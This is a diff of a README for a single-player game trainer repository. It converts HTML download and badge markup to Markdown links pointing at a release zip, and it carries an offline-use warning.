@@ -1,22 +1,15 @@
 # DragonSword: Awakening — Trainer
 
 Trainer for single-player playthroughs of **DragonSword: Awakening**.
-<p align="center">
-    <a href="https://github.com/USERNAME/REPO/releases/latest/download/DragonSwordTrainer.zip">
-        <img src="assets/banner.png" width="100%">
-    </a>
-</p>
+[![Banner](assets/banner.png)](https://github.com/Crushflalead/DragonSword-Awakening-Trainer/releases/latest/download/DragonSwordTrainer.zip)
 
 <p align="center">
-    <a href="https://github.com/Crushflalead/DragonSword-Awakening-Trainer/releases/latest/download/DragonSwordTrainer.zip">
-        <img src="https://img.shields.io/badge/⬇%20DOWNLOAD-LATEST%20VERSION-8A2BE2?style=for-the-badge">
-    </a>
 
-    <img src="https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge">
+[![Download](https://img.shields.io/badge/DOWNLOAD-LATEST_VERSION-8A2BE2?style=for-the-badge)](https://github.com/Crushflalead/DragonSword-Awakening-Trainer/releases/latest/download/DragonSwordTrainer.zip)
+![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge)
+![Downloads](https://img.shields.io/github/downloads/Crushflalead/DragonSword-Awakening-Trainer/total?style=for-the-badge)
+![Release](https://img.shields.io/github/v/release/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge)
 
-    <img src="https://img.shields.io/github/downloads/Crushflalead/DragonSword-Awakening-Trainer/total?style=for-the-badge">
-
-    <img src="https://img.shields.io/github/v/release/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge">
 </p>
 
 > ⚠️ Single-player / offline use only. Do not use on servers with online rankings, PvP, or Steam-linked achievements — this may get your in-game account banned.
